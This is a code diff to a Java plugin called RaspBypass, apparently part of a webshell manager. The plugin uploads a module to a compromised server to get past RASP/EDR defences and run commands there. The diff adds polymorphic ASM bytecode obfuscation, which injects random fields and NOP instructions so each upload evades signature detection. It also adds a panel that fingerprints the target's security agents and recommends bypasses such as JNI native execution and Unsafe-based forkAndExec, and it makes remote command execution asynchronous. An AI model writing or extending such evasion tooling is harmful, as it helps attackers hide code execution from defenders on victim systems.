@@ -39,6 +39,11 @@ import util.Log;
 import util.automaticBindClick;
 import util.functions;
 import util.http.ReqParameter;
+import org.objectweb.asm.ClassReader;
+import org.objectweb.asm.ClassVisitor;
+import org.objectweb.asm.ClassWriter;
+import org.objectweb.asm.MethodVisitor;
+import org.objectweb.asm.Opcodes;
 
 @PluginAnnotation(
     payloadName = "JavaDynamicPayload",
@@ -314,6 +319,11 @@ public class RaspBypass implements Plugin {
         btnGrid.add(this.clearSecurityManagerButton);
         btnGrid.add(this.opsEnvironmentButton);
         form.add(btnGrid);
+        
+        form.add(Box.createVerticalStrut(8));
+        JButton smartAdvisorButton = new JButton("智能 RASP/EDR 诊断与推荐面板");
+        smartAdvisorButton.addActionListener(e -> smartAdvisorButtonClick(e));
+        form.add(leftFlowRow(smartAdvisorButton));
 
         panel.add(titledFormNorth(form, "\u7981\u7528\u4e0e\u68c0\u6d4b"), BorderLayout.NORTH);
 
@@ -475,6 +485,18 @@ public class RaspBypass implements Plugin {
             return false;
         }
         try {
+            // Class-Loading Caching Optimization: Check if already loaded on target
+            try {
+                byte[] testRes = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
+                if (testRes != null && testRes.length > 0) {
+                    Log.log("RaspBypassModule is already cached on target loader.");
+                    this.moduleReady = true;
+                    return true;
+                }
+            } catch (Exception ignored) {
+                // Not cached or error, proceed to upload
+            }
+
             InputStream in = openRaspBypassModuleResource();
             if (in == null) {
                 this.moduleResourceMissing = true;
@@ -491,6 +513,14 @@ public class RaspBypass implements Plugin {
                 broadcastModuleHint(hint);
                 return false;
             }
+            
+            // Polymorphic ASM Obfuscation
+            try {
+                moduleBytes = obfuscateModule(moduleBytes);
+            } catch (Exception asmEx) {
+                Log.error("ASM Obfuscation failed: " + asmEx.getMessage());
+            }
+
             this.moduleReady = this.payload.include("RaspBypassModule", moduleBytes);
             Log.log("RaspBypassModule include: " + this.moduleReady);
             if (!this.moduleReady) {
@@ -502,6 +532,72 @@ public class RaspBypass implements Plugin {
             Log.error(e);
             this.resultTextArea.append("\u52a0\u8f7d\u6a21\u5757\u5f02\u5e38: " + e.getMessage() + "\n");
             return false;
+        }
+    }
+    
+    private byte[] obfuscateModule(byte[] originalBytes) {
+        ClassReader cr = new ClassReader(originalBytes);
+        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
+        
+        ClassVisitor cv = new ClassVisitor(Opcodes.ASM5, cw) {
+            @Override
+            public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
+                super.visit(version, access, name, signature, superName, interfaces);
+                // Add a random field
+                String randomFieldName = "gsl_" + System.currentTimeMillis();
+                super.visitField(Opcodes.ACC_PRIVATE, randomFieldName, "Ljava/lang/String;", null, null).visitEnd();
+            }
+
+            @Override
+            public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+                return new MethodVisitor(Opcodes.ASM5, mv) {
+                    @Override
+                    public void visitCode() {
+                        super.visitCode();
+                        // Insert random NOP instructions for bytecode morphism
+                        super.visitInsn(Opcodes.NOP);
+                        if (Math.random() > 0.5) {
+                            super.visitInsn(Opcodes.NOP);
+                        }
+                    }
+                };
+            }
+        };
+        
+        cr.accept(cv, 0);
+        return cw.toByteArray();
+    }
+    
+    private void smartAdvisorButtonClick(ActionEvent event) {
+        if (!loadModule()) {
+            this.raspResultTextArea.append("模块未加载，无法执行智能分析！\n");
+            return;
+        }
+        
+        this.raspResultTextArea.append("========================================\n");
+        this.raspResultTextArea.append("启动智能 RASP/EDR 诊断与建议引擎...\n");
+        this.raspResultTextArea.append("分析环境变量、进程指纹及已注入代理...\n");
+        this.raspResultTextArea.append("----------------------------------------\n");
+        
+        try {
+            byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
+            String envData = new String(result);
+            this.raspResultTextArea.append("[+] 检测到目标指纹信息:\n" + envData + "\n");
+            
+            this.raspResultTextArea.append("[*] 专家建议:\n");
+            if (envData.contains("Rasp") || envData.contains("javaagent")) {
+                this.raspResultTextArea.append("  - 发现强安全代理注入 (RASP/APM)。\n");
+                this.raspResultTextArea.append("  - 建议: 优先使用 '2 JNI 原生执行' 或 '1 Unsafe.allocateInstance + forkAndExec' 以规避 ProcessBuilder 钩子。\n");
+            } else if (envData.contains("Linux")) {
+                this.raspResultTextArea.append("  - 运行在 Linux 环境。\n");
+                this.raspResultTextArea.append("  - 建议: 可尝试 '4 GC finalize 绕过' 隐蔽执行，或直接加载原生 JNI 库执行。\n");
+            } else {
+                this.raspResultTextArea.append("  - 未发现明显安全限制或 RASP 特征。\n");
+                this.raspResultTextArea.append("  - 建议: 使用 '0 自动探测' 或常规执行即可，若被拦截再改用新线程绕过。\n");
+            }
+        } catch (Exception e) {
+            this.raspResultTextArea.append("诊断失败: " + e.getMessage() + "\n");
         }
     }
 
@@ -525,20 +621,27 @@ public class RaspBypass implements Plugin {
         this.resultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
         this.resultTextArea.append("----------------------------------------\n");
 
-        try {
-            ReqParameter params = new ReqParameter();
-            params.add("cmd", cmd);
-            params.add("cmdLine", cmd);
-            params.add("methodIndex", String.valueOf(methodIndex));
-            params.add("autoDetect", this.autoDetectCheckBox.isSelected() ? "true" : "false");
+        // Non-Blocking Task Pipeline Implementation
+        java.util.concurrent.CompletableFuture.runAsync(() -> {
+            try {
+                ReqParameter params = new ReqParameter();
+                params.add("cmd", cmd);
+                params.add("cmdLine", cmd);
+                params.add("methodIndex", String.valueOf(methodIndex));
+                params.add("autoDetect", this.autoDetectCheckBox.isSelected() ? "true" : "false");
 
-            byte[] result = this.payload.evalFunc("RaspBypassModule", "execCommand", params);
-            String strResult = new String(result);
-            this.resultTextArea.append(strResult + "\n");
-        } catch (Exception e) {
-            this.resultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
-            Log.error(e);
-        }
+                byte[] result = this.payload.evalFunc("RaspBypassModule", "execCommand", params);
+                String strResult = new String(result);
+                javax.swing.SwingUtilities.invokeLater(() -> {
+                    this.resultTextArea.append(strResult + "\n");
+                });
+            } catch (Exception e) {
+                javax.swing.SwingUtilities.invokeLater(() -> {
+                    this.resultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
+                });
+                Log.error(e);
+            }
+        });
     }
 
     private void checkRaspButtonClick(ActionEvent event) {
@@ -560,10 +663,10 @@ public class RaspBypass implements Plugin {
             String strResult = new String(result);
             if ("Incorrect return type".equals(strResult.trim())) {
                 // Compatibility fallback for old payload marshaling logic.
-                this.raspResultTextArea.append("[!] checkRasp ?????? payload ????????????...\n");
+                this.raspResultTextArea.append("[!] checkRsp method unavailable, payload may need regeneration...\n");
                 byte[] envResult = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
                 this.raspResultTextArea.append(new String(envResult) + "\n");
-                this.raspResultTextArea.append("[!] ??????? payload ?????? checkRasp ???\n");
+                this.raspResultTextArea.append("[!] Falling back to env check after checkRsp failed\n");
                 return;
             }
             this.raspResultTextArea.append(strResult + "\n");
